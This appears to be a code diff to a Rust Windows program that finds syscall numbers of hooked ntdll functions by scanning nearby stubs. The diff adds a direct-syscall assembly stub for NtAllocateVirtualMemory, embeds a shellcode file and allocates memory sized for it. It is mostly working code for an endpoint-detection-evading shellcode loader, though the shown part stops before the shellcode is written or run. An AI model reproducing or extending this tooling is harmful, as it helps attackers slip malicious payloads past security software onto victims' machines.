@@ -1,16 +1,51 @@
 use std::{
+    arch::global_asm,
     ffi::CStr,
     ops::{Add, Sub},
+    os::raw::c_void,
     ptr::null_mut,
 };
 
 use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::IMAGE_NT_HEADERS64,
+    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
     SystemServices::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
     },
 };
+
+const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
+
+global_asm!(
+    "
+    .section .data
+    SSN: .word 0
+
+    .section .text
+
+    Sys_NtAllocateVirtualMemory:
+        mov r10, rcx
+        mov rax, [rip + SSN]
+        syscall
+        ret
+    "
+);
+
+unsafe extern "system" {
+    fn Sys_NtAllocateVirtualMemory(
+        ProcessHandle: *mut c_void,
+        BaseAddress: *mut *mut c_void,
+        ZeroBits: usize,
+        RegionSize: *mut usize,
+        AllocationType: u32,
+        Protect: u32,
+    ) -> i32;
+}
+
+unsafe extern "C" {
+    static mut SSN: u32;
+}
 
 fn get_current_teb() -> PTEB {
     let mut teb: PTEB = null_mut();
@@ -51,7 +86,7 @@ fn get_hooked_ssn(func_addr: *const u8) -> u32 {
                 ssn = (high << 8) | low;
                 ssn = ssn.add(stub_count);
 
-                println!("[+] SNN: 0x{:0X}", ssn);
+                println!("[+] SSN: 0x{:0X}", ssn);
                 println!("[+] Found unhooked stub at {:p}", org_func_addr);
                 return ssn;
             } else {
@@ -81,7 +116,7 @@ fn get_hooked_ssn(func_addr: *const u8) -> u32 {
                 ssn = (high << 8) | low;
                 ssn = ssn.sub(stub_count);
 
-                println!("[+] SNN: 0x{:0X}", ssn);
+                println!("[+] SSN: 0x{:0X}", ssn);
                 println!("[+] Found unhooked stub at {:p}", org_func_addr);
                 return ssn;
             } else {
@@ -200,5 +235,34 @@ fn get_ssn(func_name: &str) -> u32 {
 
 fn main() {
     let ssn = get_ssn("NtAllocateVirtualMemory");
+    unsafe { SSN = ssn };
     println!("[+] SSN for NtAllocateVirtualMemory: 0x{:0X}", ssn);
+    let mut base_address = null_mut();
+
+    let mut size = SHELLCODE.len();
+
+    let status = unsafe {
+        Sys_NtAllocateVirtualMemory(
+            -1isize as *mut c_void,
+            &mut base_address,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        )
+    };
+
+    if status != 0 {
+        println!(
+            "[-] NtAllocateVirtualMemory failed with status: 0x{:X}",
+            status
+        );
+        return;
+    }
+
+    println!(
+        "[+] Allocated {} bytes at @=> {:p}",
+        SHELLCODE.len(),
+        base_address
+    );
 }
